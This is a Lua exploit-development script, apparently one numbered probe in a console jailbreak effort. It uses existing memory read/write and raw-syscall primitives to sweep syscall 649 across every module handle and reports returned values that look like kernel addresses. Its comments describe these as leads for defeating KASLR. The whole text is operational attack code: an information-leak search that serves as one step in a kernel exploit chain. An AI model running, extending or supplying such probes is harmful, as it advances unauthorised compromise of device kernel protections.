-- CRASH_CLASS: MODERATE
-- PROBE 579b: member tables of every module, not just eboot
--
-- Context: 54k swept member types 0-255 on handle 0 and found userland
-- addresses only. The member tables of the other 38 handles from 592 were never
-- swept. The call shape is 649(handle, member, out, size, 0, 0) -- handle
-- first. Any qword whose high half sits in the kernel range is a KASLR lead.

print("=== PROBE 579b: SYS 649 ALL HANDLES ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return to_num(memory.read_qword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end

local q = make_syscall(649)
local list = to_num(memory.alloc(0x400))
local cnt  = to_num(memory.alloc(8))
local out  = to_num(memory.alloc(0x400))

local r = sgn(make_syscall(592)(U(list), U(0x100), U(cnt), Z, Z, Z))
local n = rd(cnt)
print(string.format("[0] handles rv=%d count=%d", r, n))
if n > 60 then n = 60 end

local hits, kern, mods = 0, 0, 0
for h = 0, n - 1 do
    local handle = rd(list + h * 4)
    local per, perq = 0, 0
    for m = 0, 0xFF do
        for i = 0, 0x1F do wq(out + i * 8, Z) end
        local ok, rv = pcall(function()
            return sgn(q(U(handle), U(m), U(out), U(0x100), Z, Z))
        end)
        if ok and rv == 0 then
            local q0 = rq(out)
            local q1 = rq(out + 8)
            local q2 = rq(out + 16)
            if q0 ~= 0 or q1 ~= 0 or q2 ~= 0 then
                per = per + 1
                local hi0 = math.floor(q0 / 4294967296)
                local hi1 = math.floor(q1 / 4294967296)
                local hi2 = math.floor(q2 / 4294967296)
                local kh = 0
                if hi0 >= 0xFFFF8000 and hi0 <= 0xFFFFFFFF then kh = kh + 1 end
                if hi1 >= 0xFFFF8000 and hi1 <= 0xFFFFFFFF then kh = kh + 1 end
                if hi2 >= 0xFFFF8000 and hi2 <= 0xFFFFFFFF then kh = kh + 1 end
                if kh > 0 then
                    perq = perq + 1
                    print(string.format("[H%02X %08X] m=%3d KERNEL-HI q0=%08X:%08X q1=%08X:%08X",
                        h, handle, m, hi0, q0 % 4294967296, hi1, q1 % 4294967296))
                end
            end
        end
    end
    hits = hits + per
    kern = kern + perq
    if per > 0 then mods = mods + 1 end
    print(string.format("[H%02X] handle=%08X members-with-data=%d kernel-hi=%d", h, handle, per, perq))
end
print(string.format("[Z] total-with-data=%d kernel-hi=%d handles-with-data=%d alive=%s",
    hits, kern, mods, tostring(pcall(function() return make_syscall(20)() end))))
print("=== 579b DONE ===")
